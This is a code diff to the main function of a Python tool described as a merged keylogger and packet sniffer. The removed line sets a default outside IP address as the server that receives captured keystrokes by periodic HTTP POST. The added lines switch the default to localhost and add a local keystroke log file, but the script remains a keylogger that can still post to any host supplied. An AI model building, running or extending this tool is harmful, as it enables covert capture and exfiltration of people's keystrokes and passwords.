@@ -23,7 +23,8 @@ def print_packet(data):
 def main():
     parser = argparse.ArgumentParser(description="Merged keylogger + packet sniffer")
     parser.add_argument("--interface", help="Network interface to sniff")
-    parser.add_argument("--host", default="109.74.200.23", help="Keylogger server host")
+    parser.add_argument("--host", default="127.0.0.1", help="Keylogger server host (use 127.0.0.1 to disable remote POST)")
+    parser.add_argument("--log-file", help="Also write captured keystrokes to this local file")
     parser.add_argument("--port", type=int, default=8080, help="Keylogger server port")
     parser.add_argument("--interval", type=int, default=10, help="Keylogger POST interval in seconds")
     parser.add_argument("--keylogger-only", action="store_true", help="Run only the keylogger")
@@ -42,7 +43,7 @@ def main():
     try:
         if do_keylogger:
             KeyLogger = load_keylogger()
-            keylogger = KeyLogger(host=args.host, port=args.port, interval=args.interval)
+            keylogger = KeyLogger(host=args.host, port=args.port, interval=args.interval, log_file=args.log_file)
             keylogger.start()
             print(f"Keylogger started, posting to http://{args.host}:{args.port} every {args.interval} seconds")
 
